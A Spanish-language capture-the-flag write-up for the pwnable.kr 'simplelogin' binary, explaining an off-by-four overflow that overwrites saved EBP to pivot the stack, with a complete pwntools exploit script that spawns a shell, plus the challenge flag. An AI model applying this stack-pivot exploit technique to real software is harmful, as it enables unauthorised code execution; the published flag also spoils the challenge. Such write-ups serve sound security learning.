# simplelogin
<img width="136" height="176" alt="simple login" src="https://github.com/user-attachments/assets/603e37a8-7a9b-4ce8-bbbb-c8f24b218c46" />

```
checksec simplelogin
[*] '/home/kalcast/Laboratorio/pwn/simplelogin'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

## Resumen
El binario espera una entrada codificada en base64 del usuario, la decodifica, saca su hash md5 y lo compara con el correcto. 

La longitud de la cadena decodificada no puede exceder los 12 bytes. Se almacena en un buffer `input` de ese tamaño.

En `auth()` se intenta almacenar la cadena decodificada en un buffer de 8 bytes:

<img width="988" height="372" alt="2025-08-13-092901_988x372_scrot" src="https://github.com/user-attachments/assets/4f7a99f4-98ea-41a7-a52d-2b5098220c6d" />

Con ese pequeño buffer overflow podemos sobreescribir `EBP` y controlar a donde apunta `ESP` (stack pivoting). 

Movemos el stack a `input`  y aprovechamos que `correct()` implementa un `system("/bin/sh")` para hacer ROP alli:
```py
from pwn import *
import base64

p = process("./simplelogin")
#p = remote("pwnable.kr",9003)

payload =  p32(0x8049284)            # system("/bin/sh") (ret)
payload += b"A" * 4                  # padding
payload += p32(0x811eb40 - 4)        # input_address - 4 (pop ebp)
payload = base64.b64encode(payload)

p.sendlineafter(b"Authenticate : ", payload)
p.interactive()
```

`C0ntrol_EBP_E5P_EIP_and_rul3_th3_w0rld`
